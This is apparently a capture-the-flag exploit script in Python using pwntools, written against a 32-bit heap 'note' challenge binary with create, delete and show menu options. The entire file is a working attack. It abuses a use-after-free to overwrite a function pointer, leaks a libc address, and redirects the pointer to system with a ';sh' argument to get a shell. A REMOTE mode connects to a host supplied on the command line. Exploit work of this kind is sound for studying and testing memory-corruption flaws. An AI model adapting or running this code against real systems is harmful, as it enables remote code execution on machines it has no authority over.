#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('Your choice :', str(index))

def create(size, content):
    menu(1)
    p.sla('Note size :', str(size))
    p.sa('Content', content)

def delete(index):
    menu(2)
    p.sla('Index :', str(index))

def show(index):
    menu(3)
    p.sla('Index :', str(index))

if __name__ == '__main__':
    create(0x88, 'a')
    create(0x88, 'a')
    delete(0)
    delete(1)
    create(0x8, flat(0x0804862B))
    #gogogo('heap chunks')
    #p.i()
    #exit(0)
    show(0)
    libc.address = u32(p.r(4)) - 0xf7fd2840 + 0xf7e22000
    success('libc ' + hex(libc.address))
    create(0x88, '/bin/sh')
    delete(2)
    #magic = 0x5f066 + libc.address
    create(0x8, flat(libc.sym['system'], ';sh\x00'))
    #gogogo('heap bins')
    bc(libc.sym['system'])
    show(0)
    p.i()
